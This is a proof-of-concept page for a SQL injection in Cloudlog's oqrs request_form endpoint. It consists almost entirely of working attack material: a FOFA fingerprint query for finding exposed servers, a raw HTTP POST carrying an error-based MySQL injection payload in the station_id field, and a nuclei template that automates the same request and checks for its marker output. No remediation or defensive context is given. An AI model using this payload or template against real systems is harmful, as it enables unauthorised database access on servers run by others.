# fofa

```plain
icon_hash="-460032467"
```

# POC

```http
POST /index.php/oqrs/request_form HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```



# nuclei

```yaml
id: Cloudlog-request_form-sqli

info:
  name: Cloudlog request_form SQL injection
  author: zxf
  severity: high

http:
  - raw:
    - |
      POST /index.php/oqrs/request_form HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
      Content-Type: application/x-www-form-urlencoded
      Connection: close

      station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
    
    matchers:
      - type: word
        words:
          - "qbqkq1qbqkq1"
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1738999506044-c8f41034-c5c6-4b44-878f-3f5ef6b7d4bc.png)

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1738999487526-ad865c86-7eba-4a30-8bd8-56104493a24f.png)